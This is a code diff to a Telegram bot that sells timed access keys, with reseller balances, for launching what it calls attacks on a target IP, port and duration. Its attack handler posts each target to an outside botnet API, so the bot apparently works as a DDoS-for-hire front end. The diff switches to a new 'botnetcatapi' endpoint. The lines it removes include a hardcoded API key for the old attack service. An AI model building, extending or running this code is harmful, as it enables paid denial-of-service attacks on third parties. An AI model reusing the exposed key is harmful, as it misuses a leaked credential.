@@ -30,10 +30,6 @@ escaped_bot_link = BOT_LINK.replace('_', '\\_')
 # Per key cost for resellers
 KEY_COST = {"1hour": 30, "1day": 150, "7days": 450, "1month": 1100}
 
-# API Configuration
-API_URL = "https://web-production-c4df.up.railway.app//api/v1/attack"
-API_KEY = "HJBc15_r0VIG_ArtNdx7a0EbgiCR1fJugD30fcvv0pw"
-
 # In-memory storage
 users = {}
 keys = {}
@@ -253,7 +249,7 @@ def help_command(message):
 ❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
 🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
 💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
-🗑️ `/removereseller <reseller_id>` - *Erase a reseller's existence!* ⚰️
+🗑️ `/removereseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
 """
         bot.reply_to(message, help_text, parse_mode='Markdown')
     except Exception as e:
@@ -388,19 +384,19 @@ def process_attack_details(message):
             username = message.chat.username or "No username"
 
             # Prepare API Payload
+            api_url = "https://botnetcatapi.up.railway.app/attack"
             payload = {
                 "ip": target,
                 "port": port,
                 "time": time_val
             }
             headers = {
-                "Content-Type": "application/json",
-                "X-API-Key": API_KEY
+                "Content-Type": "application/json"
             }
 
             try:
                 # Send request to API
-                resp = requests.post(API_URL, json=payload, headers=headers, timeout=10)
+                resp = requests.post(api_url, json=payload, headers=headers, timeout=10)
                 
                 if resp.status_code == 200:
                     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time_val} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
@@ -430,7 +426,7 @@ def my_info(message):
     if user_id in admin_id:
         role = "Admin"
         key_expiration = "No access"
-        balance = "Not Applicable"  # Admins don't have balances
+        balance = "Not Applicable"  # Admins don’t have balances
     elif user_id in resellers:
         role = "Reseller"
         balance = resellers.get(user_id, 0)
@@ -438,7 +434,7 @@ def my_info(message):
     elif user_id in users:
         role = "User"
         key_expiration = users[user_id]  # Fetch expiration directly
-        balance = "Not Applicable"  # Regular users don't have balances
+        balance = "Not Applicable"  # Regular users don’t have balances
     else:
         role = "Guest"
         key_expiration = "No active key"
